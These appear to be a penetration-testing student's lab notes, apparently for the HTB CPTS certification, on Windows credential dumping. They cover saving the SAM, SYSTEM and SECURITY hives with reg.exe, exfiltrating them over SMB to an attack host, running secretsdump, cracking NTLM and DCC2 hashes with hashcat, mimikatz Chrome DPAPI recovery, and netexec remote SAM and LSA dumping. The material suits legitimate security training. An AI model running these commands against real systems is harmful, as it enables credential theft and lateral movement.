
_____________________________________IMPORTANT DUMPS-------------------------------------------

| **Registry Hive / Component**               | **Description**                                                                                                                                                    |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **HKLM\SAM**                                | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.                                         |
| **HKLM\SYSTEM**                             | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.                                                 |
| **HKLM\SECURITY**                           | Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.  |
| **LSA Secrets** _(Stored in HKLM\SECURITY)_ | Contains high-value credentials extracted from the security database, including cleartext service account passwords, auto-logon credentials, and DPAPI masterkeys. |


# 🔐 1. Attacking SAM, SYSTEM, and SECURITY

> [!info]  
> With **local administrative access** to a Windows system, we can extract registry hives containing credential material, transfer them to our attack host, and perform **offline credential extraction and cracking**.
> 
> The key advantage of offline attacks is that once the required files are copied, we no longer need to maintain an active session with the target while cracking.

```text
🎯 Local Administrator
        │
        ▼
📦 Save Registry Hives
        │
        ├── SAM      → Local password hashes
        ├── SYSTEM   → Boot Key
        └── SECURITY → LSA Secrets / DCC2 / DPAPI material
        │
        ▼
📤 Transfer to Attack Host
        │
        ▼
🧬 secretsdump
        │
        ▼
🔑 Extract Credential Material
        │
        ├── NT hashes
        ├── DCC2
        ├── LSA secrets
        └── DPAPI keys
        │
        ▼
🔥 Offline Cracking / Credential Recovery
        │
        ▼
➡️ Credential Reuse / Further Access
```

---

# 🗃️ 2. Windows Registry Hives

When we have **local administrative access**, three registry hives are particularly valuable for credential extraction:

|Registry HiveDescription||
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|

### 🧠 Why Do We Need All Three?

The important relationship is:

```text
HKLM\SAM
   │
   │ Contains
   ▼
🔑 Local Account Hashes
   ▲
   │ Requires decryption material
   │
HKLM\SYSTEM
   │
   └── System Boot Key
```

And:

```text
HKLM\SECURITY
      │
      ├── DCC2 cached domain credentials
      ├── LSA secrets
      ├── DPAPI-related material
      └── Other sensitive security information
```

> [!important]  
> If your goal is **only local SAM hashes**, `SAM + SYSTEM` are generally sufficient.
> 
> If you want to maximize credential collection from the host, also acquire **SECURITY**.

---

# 💾 3. Saving the Registry Hives with `reg.exe`

Windows provides `reg.exe`, which can be used to save copies of registry hives.

Run `cmd.exe` with administrative privileges:

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

### 🔎 What Each Command Does

```text
reg.exe save hklm\sam C:\sam.save
       │       │        │
       │       │        └── Output hive copy
       │       └─────────── Registry hive
       └────────────────── Registry utility
```

The three resulting files are:

```text
C:\sam.save
C:\system.save
C:\security.save
```

> [!warning]  
> These files contain highly sensitive authentication material. Treat them as equivalent to credential artifacts during an assessment.

---

# 📤 4. Transferring the Hives to the Attack Host

Once the hives have been saved, we can transfer them to our attack machine.

In this example, **Impacket's `smbserver.py`** is used to create an SMB share.

## 🖥️ 4.1 Create an SMB Share

```bash
keelwa@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

### 🔎 Command Breakdown

```text
smbserver.py
    │
    ├── -smb2support
    │       └── Enable SMB2 compatibility
    │
    ├── CompData
    │       └── SMB share name
    │
    └── /home/ltnbob/Documents/
            └── Directory exported through SMB
```

> [!important]  
> `-smb2support` is important when communicating with modern Windows systems because **SMBv1 is disabled by default** on many modern systems due to its serious security weaknesses.

---

# 📦 5. Moving the Hive Copies

From the Windows target, use the `move` command to send the files to the SMB share:

```cmd
C:\> move sam.save \\10.10.14.89\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.14.89\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.14.89\CompData
        1 file(s) moved.
```

The files should then appear on the attack host:

```bash
keelwa@htb[/htb]$ ls

sam.save  security.save  system.save
```

### 🧠 Transfer Mental Model

```text
             🪟 TARGET
                 │
        ┌────────┼────────┐
        ▼        ▼        ▼
      SAM      SYSTEM   SECURITY
        │        │        │
        └────────┼────────┘
                 │
                 ▼
          SMB Transfer
                 │
                 ▼
          🐧 ATTACK HOST
```

---

# 🧬 6. Dumping Hashes with `secretsdump`

Once the registry hives are on our attack machine, we can extract their contents **offline** using Impacket's `secretsdump`.

Check whether it is installed:

```bash
keelwa@htb[/htb]$ locate secretsdump
```

The important command is:

```bash
keelwa@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### 🔎 Command Breakdown

```text
secretsdump.py
    │
    ├── -sam sam.save
    │       └── SAM hive
    │
    ├── -security security.save
    │       └── SECURITY hive
    │
    ├── -system system.save
    │       └── SYSTEM hive / boot key
    │
    └── LOCAL
            └── Process local/offline hive data
```

---

# 🔑 7. The SYSTEM Boot Key

One of the first things `secretsdump` does is recover the **system boot key**:

```text
[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
```

This is important because the boot key is required to decrypt/properly process the protected SAM database.

```text
SYSTEM hive
     │
     ▼
🔑 Boot Key
     │
     ▼
🔓 Decrypt / process SAM
     │
     ▼
🗄️ Local password hashes
```

> [!important]  
> **This explains why `SAM` alone is not enough.**
> 
> Think:
> 
> **SAM = locked credential database**
> 
> **SYSTEM = contains the keying material needed to unlock/process it**

---

# 🧾 8. Understanding SAM Hash Output

`secretsdump` identifies the format:

```text
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```

The structure is:

```text
username:RID:LM_hash:NT_hash:::
```

For example:

```text
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

This means:

```text
bob
 │
 ├── RID       → 1001
 ├── LM hash   → aad3b435b51404eeaad3b435b51404ee
 └── NT hash   → 64f12cddaa88057e06a81b54e73b949b
```

### 🧠 LM vs NT Hash

|Hash|Era / Relevance|Security|CPTS Importance|
|---|---|---|---|
|**LM**|Older Windows systems|Weak|Useful when attacking legacy systems|
|**NT / NTLM-based**|Modern Windows systems|Stronger than LM, but still crackable|⭐ Primary target|

> [!important]  
> Modern Windows systems generally use **NT hashes** rather than LM hashes.
> 
> Older systems, particularly those predating **Windows Vista / Windows Server 2008**, may contain LM hashes.

### ⚠️ Recognizing the Empty/Disabled LM Hash

A common value is:

```text
aad3b435b51404eeaad3b435b51404ee
```

This frequently appears when the LM hash is not actually being used.

Likewise, this NT hash:

```text
31d6cfe0d16ae931b73c59d7e0c089c0
```

is associated with an empty password.

> [!tip]  
> Don't blindly try to crack every field. First identify **which field is the NT hash** and which accounts/hashes are actually useful.

---

# 🔥 9. Extracted SAM Hashes

The supplied `secretsdump` output contains these local accounts:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
```

The useful NT hashes can then be copied into a dedicated cracking file.

---

# 🔓 10. Cracking NT Hashes with Hashcat

Create a file containing the NT hashes:

```bash
keelwa@htb[/htb]$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

Then run Hashcat:

```bash
keelwa@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### 🧠 Hashcat Mode

```text
-m 1000
   │
   └── NTLM
```

Hashcat mode **1000** is used for NT hashes / NTLM.

> [!tip]  
> The critical Hashcat workflow is:
> 
> **Identify hash type → Find Hashcat mode → Select attack mode/wordlist → Crack**

---

# 📊 11. Hashcat Results

The example successfully recovers passwords for several hashes:

```text
f7eb9c06fafaa23c4bcf22ba6781c1e2e:dragon
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme
184ecdda8cf1dd238d438c4aea4d560d:adrian
31d6cfe0d16ae931b73c59d7e0c089c0:
```

The important result is:

```text
Status...........: Cracked
Recovered........: 5/5 (100.00%)
Hash.Name........: NTLM
```

> [!important]  
> Cracked credentials are not necessarily useful only for logging into the compromised machine.
> 
> They may be valuable for:
> 
> - 🔁 Password reuse
>     
> - 🖥️ Access to other systems
>     
> - 🌐 Access to network services
>     
> - 🚪 Further lateral movement
>     
> - ⬆️ Privilege escalation where reused credentials have higher privileges
>     

```text
🔑 Cracked Password
       │
       ▼
🔎 Test for Reuse
       │
   ┌───┴────┐
   ▼        ▼
Same Host  Other Hosts
             │
             ▼
        Lateral Movement
```

---

# 🛡️ 12. Detection & Mitigation

SAM dumping is a well-known credential-access technique and defenders can implement controls to detect or prevent it.

MITRE ATT&CK categorizes SAM credential dumping under:

**T1003.002 — Security Account Manager**

> [!warning]  
> In a real assessment, credential dumping can trigger endpoint detection, security alerts, or account/security controls. Always operate within the authorized scope of the engagement.

---

# 🧬 13. DCC2 — Domain Cached Credentials

The `HKLM\SECURITY` hive can contain **cached domain logon information**, including **DCC2 (Domain Cached Credentials v2)** hashes.

Example:

```text
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

DCC2 hashes are designed for caching domain credentials locally so users can authenticate when a Domain Controller is unavailable.

### 🔐 Why DCC2 Is Different

DCC2 uses **PBKDF2**, making it significantly slower to crack than NT hashes.

It also **cannot be directly used for Pass-the-Hash**.

```text
NT Hash
   │
   ├── Fast to crack
   └── Can potentially be used for PtH

DCC2
   │
   ├── PBKDF2
   ├── Much slower to crack
   └── Cannot directly perform PtH
```

---

# 🔥 14. Cracking DCC2 with Hashcat

Hashcat mode:

```text
2100
```

Example:

```bash
keelwa@htb[/htb]$ hashcat -m 2100 'e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b' /usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25:ihatepasswords
```

### ⚡ DCC2 vs NTLM Cracking Speed

Example speeds from the module:

```text
DCC2  → 5,536 H/s
NTLM  → 4,605.4 kH/s
```

Approximate difference:

```text
≈ 800× slower
```

> [!important]  
> The exact cracking speed depends heavily on hardware, but the core lesson is that **DCC2 is intentionally much more expensive to brute-force than NT hashes**.

### 🧠 CPTS Rule

```text
NT Hash
→ Fast
→ Common cracking target
→ Hashcat -m 1000

DCC2
→ Slow
→ PBKDF2
→ Hashcat -m 2100
→ Not directly usable for Pass-the-Hash
```

---

# 🔐 15. DPAPI

**DPAPI** stands for:

> **Data Protection Application Programming Interface**

It is a Windows API system used to encrypt and decrypt data blobs, generally protecting secrets associated with users and systems.

Applications and Windows components use DPAPI to protect stored credentials and other sensitive information.

### 🧩 Applications Using DPAPI

|ApplicationsUse of DPAPI||
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|

### 🧠 DPAPI Mental Model

```text
👤 User / Windows Component
          │
          ▼
       🔐 DPAPI
          │
          ▼
   Encrypted Data Blob
          │
          │ Requires appropriate key/context
          ▼
      🔓 Decryption
          │
          ▼
     🔑 Plaintext Secret
```

---

# 🧬 16. DPAPI Keys from SECURITY

Earlier, `secretsdump` returned:

```text
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
```

These are DPAPI-related keys/material exposed through the extracted LSA secrets.

The important concept is:

```text
HKLM\SECURITY
      │
      ▼
  LSA Secrets
      │
      ▼
 DPAPI-related material
      │
      ▼
Potentially decrypt protected application credentials
```

---

# 🌐 17. Example: Recovering Chrome Credentials with Mimikatz

The module demonstrates decrypting Chrome's stored credentials with **Mimikatz**:

```cmd
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```

### 🔎 What Happened?

```text
Chrome Login Data
       │
       ▼
Encrypted credential
       │
       ▼
DPAPI protection
       │
       ▼
CryptUnprotectData
       │
       ▼
AES key / decryption
       │
       ▼
👤 Username + 🔑 Password
```

> [!important]  
> **DPAPI can turn seemingly inaccessible application credentials into plaintext secrets when the necessary user/system key material and execution context are available.**

---

# 🌐 18. Remote LSA Secret Dumping

If we have credentials with **local administrator privileges**, we can also target LSA secrets remotely.

This can expose credentials stored by:

- ⚙️ Running services
    
- ⏰ Scheduled tasks
    
- 🖥️ Applications
    
- 🔐 Other components that use LSA secrets
    

The module demonstrates this with **NetExec**.

## 💻 18.1 Dump LSA Secrets Remotely

```bash
keelwa@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
                  netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

Example output:

```text
SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

### 🔎 Important Flag

```text
--lsa
   │
   └── Dump LSA secrets
```

And:

```text
--local-auth
   │
   └── Authenticate using a local account
```

> [!important]  
> The `(Pwn3d!)` result indicates that the supplied credentials have the required administrative access for the operation.

---

# 🗄️ 19. Remote SAM Dumping

NetExec can similarly dump the SAM database remotely.

```bash
keelwa@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

The output contains the local SAM hashes:

```text
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01      bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01      sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01      rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01      worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01      [+] Added 8 SAM hashes to the database
```

### 🧠 Local Admin → Remote Credential Dumping

```text
🔑 Local Administrator Credentials
              │
              ▼
          SMB / 445
              │
              ▼
        🖥️ Remote Host
              │
       ┌──────┴──────┐
       ▼             ▼
     --sam         --lsa
       │             │
       ▼             ▼
   SAM hashes     LSA secrets
```

---

# ⚔️ 20. Offline vs Remote Credential Dumping

|Technique|Where Processing Happens|Main Data|Example Tool|
|---|---|---|---|
|**Offline hive extraction**|Attack host|SAM / SYSTEM / SECURITY|`secretsdump.py`|
|**Remote SAM dumping**|Remote Windows host|Local SAM hashes|`netexec --sam`|
|**Remote LSA dumping**|Remote Windows host|LSA secrets|`netexec --lsa`|
|**DCC2 cracking**|Attack host|Cached domain credentials|`hashcat -m 2100`|
|**NT hash cracking**|Attack host|Local NT hashes|`hashcat -m 1000`|
|**DPAPI credential recovery**|Target/attack tooling|Application credentials|Mimikatz / Impacket|

---

# 🧠 21. The Complete CPTS Credential-Dumping Workflow

```text
                         🎯 WINDOWS TARGET
                                │
                                │ Local Administrator
                                ▼
                    ┌───────────────────────┐
                    │ Registry Credential   │
                    │ Sources               │
                    └───────────┬───────────┘
                                │
              ┌─────────────────┼─────────────────┐
              ▼                 ▼                 ▼
            🗄️ SAM           ⚙️ SYSTEM        🔐 SECURITY
              │                 │                 │
              │                 │                 ├── DCC2
              │                 │                 ├── LSA Secrets
              │                 │                 └── DPAPI material
              │                 │
              └────────┬────────┘
                       │
                       ▼
                 🔑 Boot Key
                       │
                       ▼
                 🧬 secretsdump
                       │
              ┌────────┼──────────┐
              ▼        ▼          ▼
          NT Hashes   DCC2     LSA Secrets
              │        │          │
              ▼        ▼          ▼
          Hashcat    Hashcat    Credential
         -m 1000    -m 2100     Recovery
              │        │          │
              └────────┼──────────┘
                       ▼
                🔑 Credentials
                       │
                       ▼
               🔁 Credential Reuse
                       │
                       ▼
               ➡️ Further Access
```

---

# 📋 22. CPTS Cheat Sheet

|🎯 Objective|🛠️ Technique / Command|🧠 Key Point|
|---|---|---|
|Save SAM|`reg.exe save hklm\sam C:\sam.save`|Local account hashes|
|Save SYSTEM|`reg.exe save hklm\system C:\system.save`|Provides boot key material|
|Save SECURITY|`reg.exe save hklm\security C:\security.save`|LSA secrets, DCC2, DPAPI material|
|Create SMB share|`smbserver.py -smb2support CompData <directory>`|Transfer hive files|
|Extract offline credentials|`secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`|Dump local SAM + SECURITY data|
|Crack NT hashes|`hashcat -m 1000 <hashfile> rockyou.txt`|NTLM mode|
|Crack DCC2|`hashcat -m 2100 <dcc2> rockyou.txt`|DCC2 / MS Cache 2|
|Remote SAM dump|`netexec smb <IP> --local-auth -u <user> -p <pass> --sam`|Requires appropriate local admin privileges|
|Remote LSA dump|`netexec smb <IP> --local-auth -u <user> -p <pass> --lsa`|Dumps LSA secrets|
|Chrome DPAPI recovery|`mimikatz.exe` → `dpapi::chrome ... /unprotect`|Can recover protected browser credentials|

---

# 🧠 23. High-Value CPTS Mental Models

### 🔐 SAM

```text
SAM
 ↓
Local Accounts
 ↓
NT Hashes
 ↓
Hashcat -m 1000
 ↓
Passwords
```

### 🗝️ SAM + SYSTEM

```text
SAM = 🔒 Protected hashes
SYSTEM = 🔑 Boot key
        ↓
Together
        ↓
secretsdump
        ↓
🔓 Extract hashes
```

### 🏢 SECURITY

```text
SECURITY
   │
   ├── DCC2
   │     └── Hashcat -m 2100
   │
   ├── LSA Secrets
   │     └── Service/task/application credentials
   │
   └── DPAPI material
         └── Potentially decrypt protected secrets
```

### ⚡ The Most Important Distinction

> [!success]  
> **NT hash ≠ DCC2 ≠ DPAPI secret**
> 
> They are different credential artifacts and require different techniques.
> 
> ```text
> NT Hash
>   → Hashcat -m 1000
> 
> DCC2
>   → Hashcat -m 2100
> 
> DPAPI
>   → Requires appropriate DPAPI keys/context
>   → Tools include Mimikatz / Impacket / DonPAPI
> ```

---

# 🎯 24. Key Takeaways

> [!success]
> 
> - **SAM** contains local Windows account password hashes.
>     
> - **SYSTEM** contains the system boot key needed to process/decrypt the protected SAM data.
>     
> - **SECURITY** contains valuable LSA-related information, including **DCC2, LSA secrets, and DPAPI-related material**.
>     
> - `reg.exe save` can be used to create offline copies of the three registry hives when sufficient privileges are available.
>     
> - `secretsdump.py` can process `SAM + SYSTEM + SECURITY` offline and extract credential material.
>     
> - **NT hashes** are the primary local password hashes encountered on modern Windows systems.
>     
> - Hashcat **mode `1000`** is used for NTLM hashes.
>     
> - **DCC2** uses PBKDF2 and is dramatically slower to crack than NT hashes.
>     
> - Hashcat **mode `2100`** is used for DCC2.
>     
> - DCC2 hashes **cannot directly be used for Pass-the-Hash**.
>     
> - **DPAPI** protects credentials and other sensitive data used by Windows and applications.
>     
> - Applications such as Chrome, Outlook, RDP, and Credential Manager can use DPAPI.
>     
> - Local administrator credentials can enable **remote SAM and LSA secret dumping** through SMB-based tooling.
>     
> - Cracked passwords should be checked for **credential reuse**, as reused credentials can provide access to additional systems.
>     
> 
> ### 🧠 Remember the Big Picture
> 
> ```text
> 🪟 WINDOWS COMPROMISE
>          │
>          ▼
>    👑 LOCAL ADMIN
>          │
>          ▼
>   ┌──────┼─────────┐
>   ▼      ▼         ▼
>  SAM   SYSTEM   SECURITY
>   │      │         │
>   │      │      ┌──┼─────────┐
>   │      │      ▼  ▼         ▼
>   │      │    DCC2 LSA     DPAPI
>   │      │         Secrets
>   │      │
>   └──────┴───┐
>              ▼
>        🧬 secretsdump
>              │
>       ┌──────┴──────┐
>       ▼             ▼
>   NT Hashes       Secrets
>       │
>       ▼
> 🔥 Hashcat / Credential Recovery
>       │
>       ▼
> 🔁 Reuse / Lateral Movement
> ```